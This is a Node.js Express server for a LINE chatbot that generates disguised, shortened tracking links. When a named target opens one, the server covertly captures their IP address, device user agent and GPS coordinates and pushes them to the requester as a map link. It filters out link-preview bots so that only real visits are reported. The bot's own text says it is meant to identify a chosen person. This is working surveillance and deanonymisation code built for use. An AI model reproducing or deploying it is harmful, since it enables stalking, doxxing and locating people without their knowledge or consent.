const https = require("https");
const qs = require("querystring");
const request = require("request");
const cors = require("cors");
const express = require("express");
const port = process.env.PORT || 3000;
const TOKEN = process.env.LINE_TOKEN;
const tiny_token = process.env.TINY_TOKEN;
let lock = false, random = 400, original = '', push_status = false, geolocation = '';

const app = express();

app
  .use(cors())
  .use(express.urlencoded({
    extended: true
  }))
  .use(express.json())
  .post("/webhook", (req, res) => {
    // reply msg
    res.send("HTTP POST request sent to the webhook URL!");
    random = ~~(Math.random() * (999999 - 100000) + 100000);
    const userId = req.body.events[0].source.userId;
    const ms = req.body.events[0].message.text;
    let text = "";
    if (req.body.events[0].type === 'message') {
      if(ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) {
        text = "下記のサイトで特定したい相手の名前と元のURL、認証コードを入力してください\n※入力した数字と認証コードが10回一致しなかった場合30分間は再試行ができません。ページのリロードや認証コードの再発行をしても、成功するまでは誤入力カウントや謹慎期間は続きます。\n\nhttps://rhipsali.github.io/get_ip?userId=" + userId + "\n\n認証コード: " + random;
      } else {
        text = "URLを発行したい場合は「URLを発行したい」「URLを生成して」などと話しかけてみてください";
      };
      const dataString = JSON.stringify({
        replyToken: req.body.events[0].replyToken,
        messages: [{"type": "text", "text": text}]
      });
        
      const headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + TOKEN
      };

      const webhookOptions = {
        "hostname": "api.line.me",
        "path": "/v2/bot/message/reply",
        "method": "POST",
        "headers": headers,
        "body": dataString
      };

      const request = https.request(webhookOptions, (res) => {
          res.on("data", (d) => {
            process.stdout.write(d);
          })
        })

      request.on("error", (err) => {
        console.error(err);
      })
    
      request.write(dataString);
      request.end();
    };
  })
  .post("/pass", (req, res) => {
    if (req.body.text === "ぴやっほゃ") {
      res.send(JSON.stringify({pass: random}));
    } else {
      res.sendStatus(415);
    };
  })
  .post("/lock", (req, res) => {
    if(req.body.text === "fucker") {
      lock = true;
      res.sendStatus(200);
      setTimeout(() => {
        lock = false;
      }, 1.8e+6);
    };
  })
  .get("/check", (req, res) => {
    res.send(JSON.stringify({boo: lock}));
  })
  .post("/generated", (req, res) => {
    const name = req.body.name, url = req.body.url, userId = req.query.userId || null;
    const geo = req.query.geo || 'false'; 
    const query = {
      name: name,
      original: url,
      id: userId,
      geo: geo
    };
    const longUrl = "https://static-void.herokuapp.com/get/ip/nero?" + qs.stringify(query),
    req_url = "https://tinycc.com/tiny/api/3?" + qs.stringify({
      urls: [
        {long_url: longUrl}
      ]
    });
    const options = {
      url: req_url,
      method: "GET",
      json: true
    };
    request(options, (err, response, body) => {
      if (err) {console.log(err); return};
      const generated = body.urls.short_url_with_protocol || longUrl;
      res.send(JSON.stringify({access_url: generated}));
    });
  })
  .get("/get/ip/nero", (req, res) => {
    const nom = req.query.name, id = req.query.id;
    original = req.query.original; geolocation = req.query.geo;
    res.sendFile(__dirname + '/open.html');
    // get ip
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
    str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
    // push msg
    if ( !id || 
      !(String(req.headers["accept-language"]).match(/ja/)) ||
      req.headers["user-agent"] === "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1" ||
      req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
      ) {push_status = false} else {push_status = true};
      if(push_status) {
        pushMsg(`${nom}さんがURLにアクセスしました\n\nIPアドレス: ${str}\n\n使用デバイス:\n${req.headers["user-agent"]}`, id);
        console.log(`名前: ${nom}\nIPアドレス: ${str};`);
      };
      app.post("/geo", (Req, Res) => {
        Res.sendStatus(200);
        pushMsg(`${nom}さんの位置情報が取得できました\n\n緯度: ${Req.body.lat}\n経度: ${Req.body.lng}\n\ngoogleマップで見る\nhttps://www.google.co.jp/maps/@${Req.body.lat},${Req.body.lng},20z`, id);
        return;
      });
  })
  .get("/auth", (req, res) => {
    const URL = original || "https://rhipsali.github.io/get_ip";
    res.send(JSON.stringify({url: URL, geo: geolocation}));
  })
  .listen(port, () => console.log("listening on " + port))
;

function pushMsg(text, id) {
  const msg = JSON.stringify({
    to: id,
    messages: [
      {"type": "text", "text": text}
    ]
  });

  const headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + TOKEN
  };
  const webhookOptions = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/push",
    "method": "POST",
    "headers": headers,
    "body": msg
  };
  const request = https.request(webhookOptions, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });
  });
  request.on("error", (err) => {
    console.error(err);
  });
  request.write(msg);
  request.end();
};